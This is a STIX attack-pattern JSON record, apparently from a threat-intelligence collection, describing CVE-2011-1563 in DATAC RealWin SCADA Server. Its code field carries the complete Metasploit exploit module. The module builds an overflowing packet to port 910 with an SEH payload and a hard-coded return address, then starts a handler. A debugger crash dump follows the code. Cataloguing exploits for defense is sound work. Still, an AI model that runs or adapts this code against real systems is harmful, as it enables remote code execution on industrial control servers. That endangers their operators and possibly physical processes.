{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04f9b8b1-04f9-4f08-824a-80ad2b583e01",
    "created": "2024-08-14T16:39:17.682628Z",
    "modified": "2024-08-14T16:39:17.682631Z",
    "name": "DATAC RealWin SCADA Server 2 On_FC_CONNECT_FCS_a_FILE Buffer Overflow",
    "description": " This module exploits a vulnerability found in DATAC Control International RealWin SCADA Server 2.1 and below. By supplying a specially crafted On_FC_BINFILE_FCS_*FILE packet via port 910, RealWin will try to create a file (which would be saved to C:\\Program Files\\DATAC\\Real Win\\RW-version\\filename) by first copying the user- supplied filename with an inline memcpy routine without proper bounds checking, which results a stack-based buffer overflow, allowing arbitrary remote code execution.  Tested version: 2.0 (Build 6.1.8.10) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/realwin_on_fc_binfile_a.rb",
            "external_id": "realwin_on_fc_binfile_a.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1563"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/realwin_5-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-110-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DATAC RealWin SCADA Server 2 On_FC_CONNECT_FCS_a_FILE Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in DATAC Control International RealWin\n        SCADA Server 2.1 and below. By supplying a specially crafted On_FC_BINFILE_FCS_*FILE\n        packet via port 910, RealWin will try to create a file (which would be saved to\n        C:\\Program Files\\DATAC\\Real Win\\RW-version\\filename) by first copying the user-\n        supplied filename with an inline memcpy routine without proper bounds checking, which\n        results a stack-based buffer overflow, allowing arbitrary remote code execution.\n\n        Tested version: 2.0 (Build 6.1.8.10)\n      },\n      'Author'         => [ 'Luigi Auriemma', 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-1563'],\n          [ 'OSVDB', '72826'],\n          [ 'BID', '46937'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/realwin_5-adv.txt' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-110-01']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 450,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Universal', { 'Ret' => 0x4002da21 } ], # P/P/R FlexMLang.DLL 8.1.45.19\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2011-03-21'))\n\n    register_options([Opt::RPORT(910)])\n  end\n\n  def exploit\n\n    connect\n\n    data =  [0x67542310].pack('V')\n    data << [0x00000824].pack('V')\n    data << [0x00100001].pack('V')\n    data << [0x00000001].pack('V')  #Packet type\n    data << [0x00060000].pack('V')\n    data << [0x0000ffff].pack('V')\n    data << rand_text_alpha_upper(221)\n    data << generate_seh_payload(target.ret)\n    data << rand_text_alpha_upper(17706 - payload.encoded.length)\n    data << [0x451c3500].pack('V')\n    data << [0x00000154].pack('V')\n    data << [0x00020040].pack('V')\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(data)\n    select(nil,nil,nil,0.5)\n\n    handler\n    disconnect\n\n  end\nend\n\n\n=begin\n0:022> r\neax=00000819 ebx=0587f89c ecx=00000039 edx=011fba04 esi=011fc138 edi=0587fffd\neip=0042702f esp=0587f738 ebp=011fba04 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nRealWinDemo+0x2702f:\n0042702f f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:022> !exchain\n0587f748: RealWinDemo+e0b78 (004e0b78)\n0587f9a4: FlexMLang!GetFlexMLangIResourceBrowser+2b991 (4002da21)\nInvalid exception stack at 49a206eb\n0:022> u 4002da21\nFlexMLang!GetFlexMLangIResourceBrowser+0x2b991:\n4002da21 5e              pop     esi\n4002da22 5b              pop     ebx\n4002da23 c3              ret\n=end\n",
    "x_mitre_disclosure_date": "2011-03-21",
    "x_mitre_platforms": [
        "win'"
    ]
}